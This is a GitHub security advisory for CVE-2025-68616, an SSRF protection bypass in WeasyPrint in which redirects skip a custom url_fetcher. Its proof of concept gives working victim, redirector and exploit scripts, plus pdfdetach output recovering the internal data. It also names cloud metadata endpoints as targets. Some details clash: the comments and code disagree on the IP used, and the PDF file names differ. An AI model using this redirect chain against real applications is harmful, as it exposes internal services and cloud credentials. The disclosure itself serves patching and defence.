# [H] WeasyPrint has a Server-Side Request Forgery (SSRF) Protection Bypass via HTTP Redirect

## Summary
Severity: High
Advisory: GHSA-983w-rhvv-gwmv
CVE: CVE-2025-68616
CWE: CWE-601, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-20
Source: https://github.com/advisories/GHSA-983w-rhvv-gwmv
Type: github-advisory

## Affected
- PyPI: `weasyprint` — affected >=0 <68.0

## Details
### Summary

A **Server-Side Request Forgery (SSRF) Protection Bypass** exists in WeasyPrint's `default_url_fetcher`. The vulnerability allows attackers to access internal network resources (such as `localhost` services or cloud metadata endpoints) even when a developer has implemented a custom `url_fetcher` to block such access. This occurs because the underlying `urllib` library follows HTTP redirects automatically without re-validating the new destination against the developer's security policy.

### Details

The default URL fetching mechanism in WeasyPrint (default_url_fetcher in weasyprint/urls.py) is vulnerable to a Server-Side Request Forgery (SSRF) Protection Bypass.

While WeasyPrint allows developers to define custom url_fetcher functions to validate or sanitize URLs before fetching (e.g., blocking internal IP addresses or specific ports), the underlying implementation uses Python's standard urllib.request.urlopen. By default, urllib automatically follows HTTP redirects (status codes 301, 302, 307, etc.) without returning control to the developer's validation logic for the new target URL.

This behavior creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. An attacker can provide a URL that passes the developer's allowlist/blocklist (the Check) but immediately redirects to a blocked internal resource (the Use).

### PoC

To reproduce this vulnerability, use the following setup. This scenario simulates a developer attempting to blacklist access to internal hostnames (e.g., `localhost`).

**1. victim.py (Internal Service - Port 5000)**
Simulates a sensitive internal service running on localhost.

```python
from flask import Flask
app = Flask(__name__)

@app.route('/secret')
def secret():
    return "CRITICAL_INTERNAL_DATA"

if __name__ == '__main__':
    # Listens on localhost:5000
    app.run(port=5000)
```

**2. attacker.py (External Redirector - Port 1337)**
Simulates an external server. It accepts a request and redirects it to the blocked hostname (`localhost`).

```python
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/image.png')
def malicious():
    # The vulnerability: Redirects to the BLOCKED hostname
    return redirect("http://localhost:5000/secret", code=302)

if __name__ == '__main__':
    app.run(port=1337)
```

**3. exploit.py (Vulnerable Implementation)**
Simulates the application with a security filter intended to block access to "localhost".

```python
from weasyprint import HTML, default_url_fetcher
import logging

# Security Filter: Intended to block internal hostnames
def secure_fetcher(url):
    # Simulates a blacklist for 'localhost'
    if "localhost" in url:
        raise PermissionError(f"Security Block: Access to {url} denied.")
    
    print(f"[ALLOWED] Initial URL check passed for: {url}")
    return default_url_fetcher(url)

# EXPLOIT LOGIC:
# 1. We access the attacker via '127.0.0.1' (or an external IP). 
#    The string "127.0.0.1" passes the check because it is not "localhost".
# 2. The attacker redirects to "http://localhost:5000/...".
# 3. urllib follows the redirect to 'localhost' without re-triggering secure_fetcher.

try:
    # Use 127.0.0.1 to bypass the string check for 'localhost'
    html_content = '<link rel="attachment" href="http://54.234.88.160:1337/image.png">'
    
    doc = HTML(string=html_content, url_fetcher=secure_fetcher)
    doc.write_pdf("exploit.pdf")
    
    print("Exploit successful. The 'localhost' block was bypassed via redirect.")
    print("Check exploit.pdf for 'CRITICAL_INTERNAL_DATA'.")
except Exception as e:
    print(f"Exploit failed: {e}")
```
**4. Attacker read attachment in PDF**
```
➜ pdfdetach -list resultado_exploit.pdf
1 embedded files
1: secret
➜ pdfdetach -saveall resultado_exploit.pdf
➜ cat secret
CRITICAL_INTERNAL_DATA
```
**Evidence**
<img width="1514" height="436" alt="image" src="https://github.com/user-attachments/assets/f7881694-be4d-4c63-8bca-2b220e4c87f9" />

### Impact

This vulnerability impacts any application or SaaS platform using WeasyPrint to render user-supplied HTML/CSS that attempts to restrict external resource loading.

  * **Internal Network Reconnaissance:** Attackers can bypass firewalls or allowlists to scan and access internal services (e.g., Redis, ElasticSearch, Admin Panels) running on the loopback interface or local network.
  * **Cloud Metadata Exfiltration:** In cloud environments, attackers can redirect requests to metadata services (e.g., `http://169.254.169.254`) to steal instance credentials and escalate privileges.
  * **Security Control Bypass:** It renders the `url_fetcher` security validation logic ineffective against sophisticated attacks, creating a false sense of security for developers.

## References
- https://github.com/Kozea/WeasyPrint/security/advisories/GHSA-983w-rhvv-gwmv
- https://nvd.nist.gov/vuln/detail/CVE-2025-68616
- https://github.com/Kozea/WeasyPrint/commit/b6a14f0f3f4ce9c0c75c1a2d73cb1c5d43f0e565
- https://access.redhat.com/security/cve/CVE-2025-68616
- https://bugzilla.redhat.com/show_bug.cgi?id=2430858
- https://github.com/Kozea/WeasyPrint
- https://security.access.redhat.com/data/csaf/v2/vex/2025/cve-2025-68616.json
